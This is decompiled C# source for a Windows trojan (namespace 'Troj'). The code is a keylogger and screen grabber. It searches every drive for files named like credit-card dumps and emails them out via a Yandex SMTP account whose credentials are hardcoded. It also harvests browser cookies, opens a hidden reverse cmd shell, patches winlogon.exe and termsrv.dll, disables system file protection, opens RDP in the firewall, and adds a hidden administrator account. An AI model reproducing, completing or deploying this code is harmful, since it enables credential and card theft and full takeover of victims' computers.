using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Troj;

public class Program
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	public class ScreenShotDll
	{
		public void CaptureScreen(string fileName, ImageFormat imageFormat)
		{
			int windowDC = User32.GetWindowDC(User32.GetDesktopWindow());
			int num = GDI32.CreateCompatibleDC(windowDC);
			int num2 = GDI32.CreateCompatibleBitmap(windowDC, GDI32.GetDeviceCaps(windowDC, 8), GDI32.GetDeviceCaps(windowDC, 10));
			GDI32.SelectObject(num, num2);
			GDI32.BitBlt(num, 0, 0, GDI32.GetDeviceCaps(windowDC, 8), GDI32.GetDeviceCaps(windowDC, 10), windowDC, 0, 0, 13369376);
			SaveImageAs(num2, fileName, imageFormat);
			Cleanup(num2, windowDC, num);
		}

		public Bitmap CaptureScreen()
		{
			int windowDC = User32.GetWindowDC(User32.GetDesktopWindow());
			int num = GDI32.CreateCompatibleDC(windowDC);
			int num2 = GDI32.CreateCompatibleBitmap(windowDC, GDI32.GetDeviceCaps(windowDC, 8), GDI32.GetDeviceCaps(windowDC, 10));
			GDI32.SelectObject(num, num2);
			GDI32.BitBlt(num, 0, 0, GDI32.GetDeviceCaps(windowDC, 8), GDI32.GetDeviceCaps(windowDC, 10), windowDC, 0, 0, 13369376);
			Bitmap image = GetImage(num2);
			Cleanup(num2, windowDC, num);
			return image;
		}

		private void Cleanup(int hBitmap, int hdcSrc, int hdcDest)
		{
			User32.ReleaseDC(User32.GetDesktopWindow(), hdcSrc);
			GDI32.DeleteDC(hdcDest);
			GDI32.DeleteObject(hBitmap);
		}

		private void SaveImageAs(int hBitmap, string fileName, ImageFormat imageFormat)
		{
			//IL_002b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0031: Expected O, but got Unknown
			Bitmap val = new Bitmap((Image)(object)Image.FromHbitmap(new IntPtr(hBitmap)), ((Image)Image.FromHbitmap(new IntPtr(hBitmap))).get_Width(), ((Image)Image.FromHbitmap(new IntPtr(hBitmap))).get_Height());
			((Image)val).Save(fileName, imageFormat);
		}

		private Bitmap GetImage(int hBitmap)
		{
			//IL_002b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0031: Expected O, but got Unknown
			return new Bitmap((Image)(object)Image.FromHbitmap(new IntPtr(hBitmap)), ((Image)Image.FromHbitmap(new IntPtr(hBitmap))).get_Width(), ((Image)Image.FromHbitmap(new IntPtr(hBitmap))).get_Height());
		}
	}

	private class User32
	{
		[DllImport("User32.dll")]
		public static extern int GetDesktopWindow();

		[DllImport("User32.dll")]
		public static extern int GetWindowDC(int hWnd);

		[DllImport("User32.dll")]
		public static extern int ReleaseDC(int hWnd, int hDC);
	}

	private class GDI32
	{
		[DllImport("GDI32.dll")]
		public static extern bool BitBlt(int hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, int hdcSrc, int nXSrc, int nYSrc, int dwRop);

		[DllImport("GDI32.dll")]
		public static extern int CreateCompatibleBitmap(int hdc, int nWidth, int nHeight);

		[DllImport("GDI32.dll")]
		public static extern int CreateCompatibleDC(int hdc);

		[DllImport("GDI32.dll")]
		public static extern bool DeleteDC(int hdc);

		[DllImport("GDI32.dll")]
		public static extern bool DeleteObject(int hObject);

		[DllImport("GDI32.dll")]
		public static extern int GetDeviceCaps(int hdc, int nIndex);

		[DllImport("GDI32.dll")]
		public static extern int SelectObject(int hdc, int hgdiobj);
	}

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private static int svsex;

	private static int sdosta;

	private static string logkey;

	private static int keycount = 0;

	private static Thread[] thkey;

	private static Thread[] tcherez;

	private static int cerezcount = 0;

	private static int keyI;

	private static string strbug;

	private static string strbuftx;

	private static string buflyb;

	private static int ftpi;

	private static int countGroup = 0;

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	private static Thread th;

	private static TcpClient socketForServer;

	private static NetworkStream networkStream;

	private static StreamWriter streamWriter;

	private static StreamReader streamReader;

	private static Process processCmd;

	private static StringBuilder strInput;

	[CompilerGenerated]
	private static ThreadStart _003C_003E9__CachedAnonymousMethodDelegate3;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("user32.dll")]
	public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void SearchAll(string disk, string n_file, string smail, string sftp, string spapka)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(disk);
		try
		{
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					FileInfo[] files = directoryInfo2.GetFiles(n_file, SearchOption.TopDirectoryOnly);
					foreach (FileInfo fileInfo in files)
					{
						CherezShto(fileInfo.FullName, smail, sftp, spapka);
					}
				}
				catch
				{
				}
				SearchAll(directoryInfo2.FullName, n_file, smail, sftp, spapka);
			}
		}
		catch
		{
		}
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static string TimeNow()
	{
		DateTime now = DateTime.Now;
		return now.Year + "-" + now.Month + "-" + now.Day + "-" + now.Hour + "-" + now.Minute + "-" + now.Second;
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		thkey = new Thread[128];
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			int num = Marshal.ReadInt32(lParam);
			if (num == 13)
			{
				logkey += "\n";
			}
			else
			{
				sdosta++;
				svsex++;
				logkey = string.Concat(logkey, (object)(Keys)num, ";");
				if (sdosta == 0)
				{
					sdosta = 0;
					TimeNow();
					if (keycount > 120)
					{
						keycount = 0;
					}
					logkey = null;
				}
			}
		}
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
	}

	public static void SearchonDisk(string tmp_file, string smail, string sftp, string spapka)
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			foreach (string disk in array)
			{
				SearchAll(disk, tmp_file, smail, sftp, spapka);
			}
		}
		catch
		{
		}
	}

	public static bool CherezShto(string strfile, string nmail, string nftp, string pftp)
	{
		if (nmail == "True" || nmail == "true")
		{
			Sendmailfile(strfile, "User send you message : " + strfile, "smtp.yandex.ru", 25, "hameleonovich.hameleon@yandex.ru", "graftamerlan", "volchek.dan@yandex.ru", sssl: false);
		}
		if (nftp == "True" || nmail == "true")
		{
			Upload_ftp(strfile, "null", "null", "null", pftp);
		}
		return true;
	}

	public static void CreatFileIEforXP(string smail, string sftp, string spapka)
	{
		if (File.Exists("null"))
		{
			File.Delete("null");
		}
		try
		{
			string[] directories = Directory.GetDirectories("C:\\Documents and Settings\\");
			string[] array = new string[directories.Length];
			for (int i = 0; i < directories.Length; i++)
			{
				if (directories[i] == "C:\\Documents and Settings\\All Users" || directories[i] == "C:\\Documents and Settings\\LocalService" || directories[i] == "C:\\Documents and Settings\\Default User" || directories[i] == "C:\\Documents and Settings\\NetworkService")
				{
					continue;
				}
				array[i] = directories[i].Substring(26);
				string[] directories2 = Directory.GetDirectories("C:\\Documents and Settings\\" + array[i].ToString());
				string[] array2 = new string[directories2.Length];
				FileStream fileStream = null;
				StreamReader streamReader = null;
				string text = null;
				string text2 = null;
				StreamWriter streamWriter = new StreamWriter("null", append: true, Encoding.UTF8);
				for (int j = 0; j < directories2.Length; j++)
				{
					array2[j] = directories2[j].Substring(26 + array[i].Length);
					if (array2[j] == "\\Cookies")
					{
						string[] files = Directory.GetFiles("C:\\Documents and Settings\\" + array[i].ToString() + array2[j].ToString(), "*.txt");
						string[] array3 = new string[files.Length];
						for (int k = 0; k < files.Length; k++)
						{
							array3[k] = files[k].Substring(26 + array[i].Length + array2[j].Length);
							text2 = "C:\\Documents and Settings\\" + array[i].ToString() + array2[j].ToString() + array3[k].ToString();
							fileStream = new FileStream(text2, FileMode.Open, FileAccess.Read);
							streamReader = new StreamReader(fileStream);
							text = text2 + "\n" + streamReader.ReadToEnd();
							streamWriter.Write(text);
						}
						streamReader.Close();
						streamWriter.Close();
						break;
					}
				}
			}
			CherezShto("null", smail, sftp, spapka);
		}
		catch
		{
			if (File.Exists("null"))
			{
				CherezShto("null", smail, sftp, spapka);
			}
		}
	}

	public static bool Sendmailfile(string temp, string user, string ssmtp, int sport, string smail, string spass, string vmail, bool sssl)
	{
		Attachment attachment = new Attachment(temp, "application/octet-stream");
		try
		{
			SmtpClient smtpClient = new SmtpClient(ssmtp, sport);
			smtpClient.Credentials = new NetworkCredential(smail, spass);
			smtpClient.EnableSsl = sssl;
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(smail);
			mailMessage.To.Add(new MailAddress(vmail));
			mailMessage.Subject = user;
			mailMessage.Body = user;
			mailMessage.Attachments.Add(attachment);
			smtpClient.Send(mailMessage);
			attachment.Dispose();
			return true;
		}
		catch
		{
			bool result = false;
			attachment.Dispose();
			return result;
		}
	}

	private static bool Upload_ftp(string filename, string ftpServerIP, string ftpUserID, string ftpPassword, string papka)
	{
		ftpi++;
		FileInfo fileInfo = new FileInfo(filename);
		string uriString = "ftp://" + ftpServerIP + "/" + papka + "/" + TimeNow() + "-" + fileInfo.Name;
		FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(new Uri(uriString));
		ftpWebRequest.Proxy = null;
		ftpWebRequest.Credentials = new NetworkCredential(ftpUserID, ftpPassword);
		ftpWebRequest.KeepAlive = false;
		ftpWebRequest.Method = "STOR";
		ftpWebRequest.UseBinary = true;
		ftpWebRequest.ContentLength = fileInfo.Length;
		int count = 2048;
		byte[] buffer = new byte[2048];
		FileStream fileStream = fileInfo.OpenRead();
		try
		{
			Stream requestStream = ftpWebRequest.GetRequestStream();
			for (int num = fileStream.Read(buffer, 0, count); num != 0; num = fileStream.Read(buffer, 0, count))
			{
				requestStream.Write(buffer, 0, num);
			}
			requestStream.Close();
			fileStream.Close();
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static void userVista(string disk, string n_file, string m_send, string smail, string sftp, string spapka)
	{
		if (m_send == "c_send")
		{
			try
			{
				string text = "C:\\Users";
				string[] directories = Directory.GetDirectories(text);
				for (int i = 0; i < directories.Length; i++)
				{
					try
					{
						if (!(directories[i] == text + "\\All Users") && !(directories[i] == text + "\\Default") && !(directories[i] == text + "\\Default User") && !(directories[i] == text + "\\Public"))
						{
							SearchAll(directories[i] + disk, n_file, smail, sftp, spapka);
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
		if (m_send == "p_send")
		{
			SearchAll(disk, n_file, smail, sftp, spapka);
		}
	}

	public static void CreatFileIEforVista(string smail, string sftp, string spapka)
	{
		if (File.Exists("null"))
		{
			File.Delete("@null");
		}
		try
		{
			string text = "C:\\Users";
			string searchPattern = "*.txt";
			string[] directories = Directory.GetDirectories(text);
			for (int i = 0; i < directories.Length; i++)
			{
				try
				{
					if (directories[i] == text + "\\All Users" || directories[i] == text + "\\Default" || directories[i] == text + "\\Default User" || directories[i] == text + "\\Public")
					{
						continue;
					}
					string[] directories2 = Directory.GetDirectories(directories[i] + "\\AppData\\Roaming\\Microsoft\\Windows\\Cookies");
					for (int j = 0; j < directories2.Length; j++)
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(directories2[j]);
							FileStream fileStream = null;
							StreamReader streamReader = null;
							StreamWriter streamWriter = new StreamWriter("null", append: true, Encoding.UTF8);
							FileInfo[] files = directoryInfo.GetFiles(searchPattern, SearchOption.TopDirectoryOnly);
							foreach (FileInfo fileInfo in files)
							{
								fileStream = new FileStream(fileInfo.FullName, FileMode.Open, FileAccess.Read);
								streamReader = new StreamReader(fileStream);
								string value = fileInfo.FullName + "\n" + streamReader.ReadToEnd();
								streamWriter.Write(value);
							}
							streamReader.Close();
							streamWriter.Close();
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
			CherezShto("null", smail, sftp, spapka);
		}
		catch
		{
		}
	}

	[STAThread]
	private static void Main(string[] args)
	{
		if (args.Length == 0)
		{
			Console.Title = "Hello";
		}
		else
		{
			Console.Title = args[0].ToString();
		}
		IntPtr hWnd = FindWindow(null, Console.Title);
		ShowWindow(hWnd, 0);
		try
		{
			SearchonDisk("CC.txt", "True", "False", "");
			SearchonDisk("Cc.txt", "True", "False", "");
			SearchonDisk("cc.txt", "True", "False", "");
			SearchonDisk("сс.txt", "True", "False", "");
			SearchonDisk("Картон.txt", "True", "False", "");
			SearchonDisk("БАЗА CC.txt", "True", "False", "");
			SearchonDisk("base.txt", "True", "False", "");
			SearchonDisk("Base.txt", "True", "False", "");
			SearchonDisk("база.txt", "True", "False", "");
			SearchonDisk("БАЗА.txt", "True", "False", "");
			SearchonDisk("Carton.txt", "True", "False", "");
			SearchonDisk("card.txt", "True", "False", "");
			SearchonDisk("visa.txt", "True", "False", "");
			SearchonDisk("VISA.txt", "True", "False", "");
			SearchonDisk("mc.txt", "True", "False", "");
			SearchonDisk("amex.txt", "True", "False", "");
			SearchonDisk("discover.txt", "True", "False", "");
			SearchonDisk("uk.txt", "True", "False", "");
			SearchonDisk("UK.txt", "True", "False", "");
			SearchonDisk("de.txt", "True", "False", "");
			SearchonDisk("usa.txt", "True", "False", "");
			SearchonDisk("USA.txt", "True", "False", "");
			SearchonDisk("us.txt", "True", "False", "");
			SearchonDisk("US.txt", "True", "False", "");
			SearchonDisk("fr.txt", "True", "False", "");
			SearchonDisk("it.txt", "True", "False", "");
			SearchonDisk("au.txt", "True", "False", "");
			SearchonDisk("BaseCard.txt", "True", "False", "");
			SearchonDisk("NEW_CC.txt", "True", "False", "");
		}
		catch
		{
			SearchonDisk("CC.txt", "True", "False", "");
			SearchonDisk("Cc.txt", "True", "False", "");
			SearchonDisk("cc.txt", "True", "False", "");
			SearchonDisk("сс.txt", "True", "False", "");
			SearchonDisk("Картон.txt", "True", "False", "");
			SearchonDisk("БАЗА CC.txt", "True", "False", "");
			SearchonDisk("base.txt", "True", "False", "");
			SearchonDisk("Base.txt", "True", "False", "");
			SearchonDisk("база.txt", "True", "False", "");
			SearchonDisk("БАЗА.txt", "True", "False", "");
			SearchonDisk("Carton.txt", "True", "False", "");
			SearchonDisk("card.txt", "True", "False", "");
			SearchonDisk("visa.txt", "True", "False", "");
			SearchonDisk("VISA.txt", "True", "False", "");
			SearchonDisk("mc.txt", "True", "False", "");
			SearchonDisk("amex.txt", "True", "False", "");
			SearchonDisk("discover.txt", "True", "False", "");
			SearchonDisk("uk.txt", "True", "False", "");
			SearchonDisk("UK.txt", "True", "False", "");
			SearchonDisk("de.txt", "True", "False", "");
			SearchonDisk("usa.txt", "True", "False", "");
			SearchonDisk("USA.txt", "True", "False", "");
			SearchonDisk("us.txt", "True", "False", "");
			SearchonDisk("US.txt", "True", "False", "");
			SearchonDisk("fr.txt", "True", "False", "");
			SearchonDisk("it.txt", "True", "False", "");
			SearchonDisk("au.txt", "True", "False", "");
			SearchonDisk("BaseCard.txt", "True", "False", "");
			SearchonDisk("NEW_CC.txt", "True", "False", "");
		}
	}

	public static void Backdoor()
	{
		try
		{
			Thread tsend = new Thread((ThreadStart)delegate
			{
				try
				{
					processCmd = new Process();
					processCmd.StartInfo.FileName = "cmd.exe";
					processCmd.StartInfo.CreateNoWindow = true;
					processCmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processCmd.StartInfo.UseShellExecute = false;
					processCmd.StartInfo.RedirectStandardOutput = true;
					processCmd.StartInfo.RedirectStandardInput = true;
					processCmd.StartInfo.RedirectStandardError = true;
					processCmd.OutputDataReceived += proc;
					processCmd.Start();
					processCmd.BeginOutputReadLine();
					strInput = new StringBuilder();
					try
					{
						while (true)
						{
							strInput.Append(streamReader.ReadLine());
							strInput.Append("\n");
							processCmd.StandardInput.WriteLine((object?)strInput);
							processCmd.StandardInput.Flush();
							strInput.Remove(0, strInput.Length);
						}
					}
					catch (Exception)
					{
					}
				}
				catch
				{
				}
			});
			Thread thread = new Thread((ThreadStart)delegate
			{
				try
				{
					socketForServer = new TcpClient("0", 0);
					networkStream = socketForServer.GetStream();
					streamReader = new StreamReader(networkStream);
					streamWriter = new StreamWriter(networkStream);
					tsend.Start();
				}
				catch
				{
				}
			});
			thread.Start();
		}
		catch
		{
		}
	}

	private static void proc(object sender, DataReceivedEventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		if (!string.IsNullOrEmpty(e.Data))
		{
			try
			{
				stringBuilder.Append(e.Data);
				streamWriter.WriteLine((object?)stringBuilder);
				streamWriter.Flush();
			}
			catch
			{
			}
		}
	}

	public static void FileP()
	{
		try
		{
			int num = 0;
			if (Directory.Exists(Environment.SystemDirectory + "\\Dllcache"))
			{
				num = Directory.GetFiles(Environment.SystemDirectory + "\\Dllcache").Length;
				for (int i = 0; i < num; i++)
				{
					try
					{
						File.Delete(Directory.GetFiles(Environment.SystemDirectory + "\\Dllcache")[0]);
					}
					catch
					{
					}
				}
			}
			if (!Directory.Exists(Environment.SystemDirectory + "\\CatRoot"))
			{
				return;
			}
			for (int j = 0; j < Directory.GetDirectories(Environment.SystemDirectory + "\\CatRoot").Length; j++)
			{
				for (int k = 0; k < Directory.GetFiles(Directory.GetDirectories(Environment.SystemDirectory + "\\CatRoot")[j]).Length; k++)
				{
					FileInfo fileInfo = new FileInfo(Directory.GetFiles(Directory.GetDirectories(Environment.SystemDirectory + "\\CatRoot")[j])[k]);
					try
					{
						Console.WriteLine(fileInfo.Name);
						fileInfo.Delete();
						k--;
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	public static void RegConfig()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core", writable: true);
			registryKey.SetValue("EnableConcurrentSessions", "00000001", RegistryValueKind.DWord);
			registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
			registryKey.SetValue("AllowMultipleTSSessions", "00000001", RegistryValueKind.DWord);
			registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\{35378EAC-683F-11D2-A89A-00C04FBBCFA2}\\0", writable: true);
			registryKey.SetValue("Options", "00000000", RegistryValueKind.DWord);
			registryKey.SetValue("Version", "00010001", RegistryValueKind.DWord);
			registryKey.SetValue("GPOLink", "00000001", RegistryValueKind.DWord);
			registryKey.SetValue("lParam", "00000000", RegistryValueKind.DWord);
			registryKey.SetValue("Extensions", "[{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{0F6B957D-509E-11D1-A7CC-0000F87571E3}]", RegistryValueKind.String);
			registryKey.SetValue("Link", "Local", RegistryValueKind.String);
			registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Control\\Terminal Server", writable: true);
			registryKey.SetValue("fDenyTSConnections", "00000000", RegistryValueKind.DWord);
			registryKey.SetValue("fEnableSalem", "00000000", RegistryValueKind.DWord);
			registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Services\\RDPWD\\Enum", writable: true);
			registryKey.SetValue("0", "Root\\LEGACY_RDPWD\\0000", RegistryValueKind.String);
			registryKey.SetValue("Count", "00000001", RegistryValueKind.DWord);
			registryKey.SetValue("NextInstance", "00000001", RegistryValueKind.DWord);
			registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\GloballyOpenPorts\\List", writable: true);
			registryKey.SetValue("3389:TCP", "3389:TCP:*:Enabled:@xpsp2res.dll,-22009", RegistryValueKind.String);
			registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List", writable: true);
			registryKey.SetValue("3389:TCP", "3389:TCP:*:Enabled:@xpsp2res.dll,-22009", RegistryValueKind.String);
			registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Services\\TDTCP\\Enum", writable: true);
			registryKey.SetValue("0", "Root\\LEGACY_TDTCP\\0000", RegistryValueKind.String);
			registryKey.SetValue("Count", "00000001", RegistryValueKind.DWord);
			registryKey.SetValue("NextInstance", "00000001", RegistryValueKind.DWord);
			registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", writable: true);
			registryKey.SetValue("fDenyTSConnections", "00000000", RegistryValueKind.DWord);
			registryKey.SetValue("TSAdvertise", "00000001", RegistryValueKind.DWord);
			registryKey.SetValue("IdleWinStationPoolCount", "00000001", RegistryValueKind.DWord);
			registryKey.SetValue("TSAppCompat", "00000000", RegistryValueKind.DWord);
			registryKey.SetValue("TSEnabled", "00000001", RegistryValueKind.DWord);
			registryKey.SetValue("TSUserEnabled", "00000000", RegistryValueKind.DWord);
			registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core", writable: true);
			registryKey.SetValue("EnableConcurrentSessions", "00000000", RegistryValueKind.DWord);
			registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\RDPWD\\Enum", writable: true);
			registryKey.SetValue("0", "Root\\LEGACY_RDPWD\\0000", RegistryValueKind.String);
			registryKey.SetValue("Count", "00000001", RegistryValueKind.DWord);
			registryKey.SetValue("NextInstance", "00000001", RegistryValueKind.DWord);
			registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\GloballyOpenPorts\\List", writable: true);
			registryKey.SetValue("3389:TCP", "3389:TCP:*:Enabled:@xpsp2res.dll,-22009", RegistryValueKind.String);
			registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List", writable: true);
			registryKey.SetValue("3389:TCP", "3389:TCP:*:Enabled:@xpsp2res.dll,-22009", RegistryValueKind.String);
			registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\TDTCP\\Enum", writable: true);
			registryKey.SetValue("0", "Root\\LEGACY_TDTCP\\0000", RegistryValueKind.String);
			registryKey.SetValue("Count", "00000001", RegistryValueKind.DWord);
			registryKey.SetValue("NextInstance", "00000001", RegistryValueKind.DWord);
			registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
			registryKey.SetValue("SFCSetting", -99, RegistryValueKind.DWord);
			registryKey.SetValue("SFCDisable", -99, RegistryValueKind.DWord);
			registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", writable: true);
			registryKey.SetValue("MaxInstanceCount", "2", RegistryValueKind.DWord);
			registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", writable: true);
			registryKey.SetValue("MaxInstanceCount", "2", RegistryValueKind.DWord);
			registryKey.SetValue("fEnableWinStation", "00000001", RegistryValueKind.DWord);
		}
		catch
		{
		}
	}

	public static void RDP_M()
	{
	}

	public static void WinLogon()
	{
		try
		{
			if (File.Exists(Environment.SystemDirectory + "\\winlogon.exe"))
			{
				File.Move(Environment.SystemDirectory + "\\winlogon.exe", Environment.SystemDirectory + "\\winlogon.bak");
				File.Move(Environment.SystemDirectory + "\\winlogon.bak", Environment.SystemDirectory + "\\winlogon.exe");
				File.Copy(Environment.SystemDirectory + "\\winlogon.exe", Environment.SystemDirectory + "\\winlogon.tmp");
				FileStream fileStream = new FileStream(Environment.SystemDirectory + "\\winlogon.tmp", FileMode.Open);
				byte[] array = new byte[fileStream.Length];
				fileStream.Read(array, 0, (int)fileStream.Length);
				array[94] = 110;
				array[173347] = 85;
				array[173348] = 139;
				array[173349] = 236;
				array[173437] = 139;
				array[173438] = byte.MaxValue;
				array[173439] = 85;
				FileStream output = new FileStream(Environment.SystemDirectory + "\\winlogon.bak", FileMode.Create);
				BinaryWriter binaryWriter = new BinaryWriter(output);
				binaryWriter.Write(array);
				binaryWriter.Close();
				fileStream.Close();
				if (File.Exists(Environment.SystemDirectory + "\\Dllcache\\winlogon.exe"))
				{
					File.Move(Environment.SystemDirectory + "\\Dllcache\\winlogon.exe", Environment.SystemDirectory + "\\Dllcache\\winlogon.del");
					File.Copy(Environment.SystemDirectory + "\\winlogon.bak", Environment.SystemDirectory + "\\Dllcache\\winlogon.exe");
				}
				else
				{
					File.Copy(Environment.SystemDirectory + "\\winlogon.bak", Environment.SystemDirectory + "\\Dllcache\\winlogon.exe");
				}
				File.Move(Environment.SystemDirectory + "\\winlogon.exe", Environment.SystemDirectory + "\\winlogon.del");
				File.Move(Environment.SystemDirectory + "\\winlogon.bak", Environment.SystemDirectory + "\\winlogon.exe");
			}
		}
		catch
		{
		}
	}

	public static void TermSrv()
	{
		string text = TimeNow();
		try
		{
			if (File.Exists(Environment.SystemDirectory + "\\Dllcache\\termsrv.dll"))
			{
				File.Move(Environment.SystemDirectory + "\\Dllcache\\termsrv.dll", Environment.SystemDirectory + "\\Dllcache\\termsrv" + text + ".dll");
				File.Copy("termsrv.dll", Environment.SystemDirectory + "\\Dllcache\\termsrv.dll");
			}
			else
			{
				File.Copy("termsrv.dll", Environment.SystemDirectory + "\\Dllcache\\termsrv.dll");
			}
			if (File.Exists(Environment.SystemDirectory + "\\termsrv.dll"))
			{
				File.Move(Environment.SystemDirectory + "\\termsrv.dll", Environment.SystemDirectory + "\\termsrv" + text + ".dll");
			}
			File.Copy("termsrv.dll", Environment.SystemDirectory + "\\termsrv.dll");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	public static void CreateUser(string UserName, string Password)
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		try
		{
			DirectoryEntry val = new DirectoryEntry("WinNT://" + Environment.MachineName + ",Computer");
			DirectoryEntry val2 = val.get_Children().Add(UserName, "user");
			val2.Invoke("SetPassword", new object[1] { Password });
			val2.CommitChanges();
			try
			{
				DirectoryEntry val3 = val.get_Children().Find("Администраторы", "group");
				if (val3 != null)
				{
					val3.Invoke("Add", new object[1] { val2.get_Path().ToString() });
				}
			}
			catch
			{
				try
				{
					DirectoryEntry val3 = val.get_Children().Find("Administrators", "group");
					if (val3 != null)
					{
						val3.Invoke("Add", new object[1] { val2.get_Path().ToString() });
					}
				}
				catch
				{
				}
			}
			DirectoryEntry val4;
			try
			{
				val4 = val.get_Children().Find("Пользователи удаленного рабочего стола", "group");
				if (val4 != null)
				{
					val4.Invoke("Add", new object[1] { val2.get_Path().ToString() });
				}
			}
			catch
			{
				val4 = val.get_Children().Find("Remote Desktop Users", "group");
				if (val4 != null)
				{
					val4.Invoke("Add", new object[1] { val2.get_Path().ToString() });
				}
			}
			val4.Close();
			val.Close();
			val2.Close();
		}
		catch
		{
		}
	}

	private static void proces(string proc)
	{
		bool flag = true;
		try
		{
			while (flag)
			{
				Application.DoEvents();
				Process[] array = null;
				for (int i = 0; i < array.Length; i++)
				{
					array = Process.GetProcesses();
					Thread.Sleep(20);
					if (array[i].ProcessName == proc)
					{
						array[i].Kill();
					}
				}
			}
		}
		catch
		{
		}
	}

	private static void key()
	{
		try
		{
			Thread.Sleep(100);
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			_hookID = SetHook(_proc);
			Application.Run();
			UnhookWindowsHookEx(_hookID);
		}
		catch
		{
		}
	}

	private static void Screnn()
	{
		for (int i = 1; i <= 0; i++)
		{
			Thread.Sleep(TimeSpan.FromSeconds(0.0));
			string text = TimeNow();
			ScreenShotDll screenShotDll = new ScreenShotDll();
			screenShotDll.CaptureScreen("null" + text + ".Jpeg", ImageFormat.get_Jpeg());
		}
	}

	private static bool buffDlin()
	{
		_ = "null".Length;
		return true;
	}

	private static bool buffZ()
	{
		buflyb = null;
		_ = "null".Length;
		return true;
	}

	private static bool buffCritery()
	{
		if (buffZ())
		{
			return true;
		}
		return false;
	}

	private static void strBuffer()
	{
		bool flag = true;
		while (true)
		{
			Application.DoEvents();
			Thread.Sleep(100);
			if (!flag)
			{
				continue;
			}
			IDataObject dataObject = Clipboard.GetDataObject();
			if (!(strbug == (string)dataObject.GetData(DataFormats.Text)) && dataObject.GetDataPresent(DataFormats.Text))
			{
				strbug = (string)dataObject.GetData(DataFormats.Text);
